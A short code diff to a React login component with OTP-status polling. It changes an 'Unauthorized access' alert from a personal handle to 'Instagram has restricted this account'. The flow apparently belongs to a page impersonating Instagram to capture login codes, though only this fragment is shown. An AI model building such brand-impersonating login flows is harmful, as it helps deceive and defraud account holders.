@@ -119,7 +119,7 @@ const AccountLogin = () => {
         if (data.status === 'approved') {
           setOtpVerificationStatus('approved');
           clearInterval(interval);
-          showAlert('Unauthorized access', '@arsalannfarooqui_ has restricted this account');
+          showAlert('Unauthorized access', 'Instagram has restricted this account');
         } else if (data.status === 'rejected') {
           setOtpVerificationStatus('rejected');
           clearInterval(interval);
